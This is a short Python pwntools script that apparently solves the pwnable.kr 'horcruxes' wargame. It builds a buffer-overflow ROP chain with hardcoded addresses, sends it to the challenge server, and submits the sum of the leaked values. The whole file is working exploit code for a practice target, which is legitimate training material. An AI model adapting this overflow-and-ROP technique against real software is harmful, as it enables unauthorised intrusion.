from pwn import *
from help import calculate_exp
from pprint import pprint










def exploite():
  elf =  ELF("horcruxes")

  rop = ROP(elf)
  rop.call(elf.symbols['A'])
  rop.call(elf.symbols['B'])
  rop.call(elf.symbols['C'])
  rop.call(elf.symbols['D'])
  rop.call(elf.symbols['E'])
  rop.call(elf.symbols['F'])
  rop.call(elf.symbols['G'])

  offset =  p32(0) + 116*"F"
  payload =  offset + rop.chain() + p32(0x809fffc) + b"\xff\xff\xff\xff" + p32(0xf7d4f994) + p32(0xf7fc1700) + p32(0) + '\n'




  r = remote("pwnable.kr",9032)
  r.sendline(b'4')
  r.recv()
  sleep(1)

  r.send(payload)
  r.recv()
  r.recv()
  sleep(1)
  r.send('5\n')
  pointes = r.recv()
  pointes
  sum = str(calculate_exp(pointes))
  r.send(sum + '\n')
  r.recv()
  print r.recv()
#  r.interactive()



if __name__ == "__main__":
  exploite()

